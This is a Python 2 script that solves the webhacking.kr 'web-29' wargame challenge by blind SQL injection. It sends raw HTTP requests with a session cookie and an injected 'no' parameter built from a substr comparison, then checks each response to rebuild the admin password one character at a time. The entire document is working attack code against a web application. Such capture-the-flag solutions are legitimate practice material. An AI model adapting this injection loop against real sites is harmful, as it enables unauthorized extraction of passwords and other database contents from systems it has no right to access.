import socket
import re

pw=""
my_cookie="cookie value"

host="Host: webhacking.kr\n"
cookie="Cookie: PHPSESSID=%s\n\n" % my_cookie

web = 'webhacking.kr'
ip = socket.gethostbyname(web)

socket.setdefaulttimeout(5)

for i in range(1,30): 
    s = socket.socket()
    s.connect((ip, 80))
    k=""
    for j in range(36,127):
        head1="GET /challenge/web/web-29/index.php?no=2%7C%7Csubstr(pw,"
        head2=str(i)
        head3=",1)="
        head4=hex(j)
        head5="&id=guest&pw=guest HTTP/1.1\n"
        s.send(head1+head2+head3+head4+head5+host+cookie)
        aa=s.recv(1024)
        print("i: %d, j: %d (%s)") % (i, j, chr(j))
        find = re.findall("admin password :",aa)
        find2 = re.findall("Success",aa)

        if find:
            pw+=chr(j)
            print "find pw: " + pw
            break

        if find2:
            k=chr(j)

        if j == 126:
            if k:
                pw+=k
                print "find2 pw: " + pw
                break
            else:
                s.close()
                pw = pw.lower()
                print "pw is %s" %(pw)
                exit()
